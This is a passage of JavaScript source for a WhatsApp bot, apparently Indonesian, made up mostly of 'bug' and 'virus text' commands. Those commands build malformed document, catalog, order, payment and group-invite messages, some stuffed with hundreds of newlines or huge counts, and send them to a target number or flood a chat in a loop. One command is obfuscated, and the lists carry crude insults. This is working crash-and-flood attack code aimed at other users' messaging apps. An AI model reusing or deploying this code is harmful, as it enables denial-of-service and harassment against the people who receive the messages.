"optionName": `Saya ${teks}`
},
{
"optionName": `Dimari Kalau Ada ${teks} Jangan lari`
}
],
"selectableOptionsCount": 2
}
}), { userJid: m.chat, quoted:m })
haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
}
break
//=================================================//
case 'jadikatalog': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw 'Reply Image/sticker'
let teks = `${q}`
{
function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','Wa.me/6285608484711','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':ppnyauser,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':m});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
}
}
break
//=================================================//
case 'jadidocu': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jadidarknes': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jadivirtext1': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🔥 ${teks} ${iphone}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext2': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🔥 ${teks} ${iphone1}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtex3t': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone2}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext4': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone3}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext5': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone4}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext6': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone5}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext7': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone6}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext8': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext9': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonvirus}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext10': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted:m })
}
}
break
//=================================================//
case 'jadibuginvite': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"groupName": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"caption": `🔥 ${teks} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m })
haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}
break
//=================================================//
case 'jadibugpayment' : {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
//=================================================//
case 'jadibugsw': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
joau = fs.readFileSync('./baseikal/video/haikal.mp4')
haikal.sendMessage(m.chat, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadibugbutton':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
const buttonssk = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonnnnmMessage = {
text: `🔥 ${teks} ${bugsw}`,
footerText: '🔥 ${teks} ',
buttons: buttonssk,
headerType: 1
}
haikal.sendMessage(m.chat, buttonnnnmMessage)
}
 break
//=================================================//
case 'sendbuglist': case 'sendbuglist2': case 'sendbuglist3': case 'sendbuglist4': case 'sendbuglist5':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
touchmebre = [
{
title: `🌷 HW MODS WA WA 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
haikal.sendListMsg(Pe, `🌷 HW MODS WA WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
break
//=================================================//
case 'sendtrol': case 'sendtrol3': case 'sendtrol4': case 'sendtrol5': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY HW MODS WA",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, order.message, { messageId: order.key.id })
}
break
//=================================================//
case 'senddocu': case 'senddocu3': case 'senddocu4': case 'senddocu5': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ☆DARKNESS⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
haikal.relayMessage(Pe, document.message, { messageId: document.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'senddocu2': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 HW MODS WA☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
haikal.relayMessage(Pe, document.message, { messageId: document.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'virtext1': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `HW MODS WA${iphone}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext2': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `HW MODS WA${iphone1}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext3': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `HW MODS WA${iphone2}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext4': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `HW MODS WA${iphone3}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext5': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `HW MODS WA${iphone4}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext6': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `HW MODS WA${iphone5}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext7': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `HW MODS WA${iphone6}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext8': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `HW MODS WA${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext9': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `HW MODS WA${buttonvirus}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext10': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `HW MODS WA${ngazap(prefix)}`}, { quoted:m })
}
}
break
case 'sendvirus': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `HW MODS WA${iphone}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus2': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `HW MODS WA${iphone1}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus3': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `HW MODS WA${iphone2}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus4': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `HW MODS WA${iphone3}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus5': {
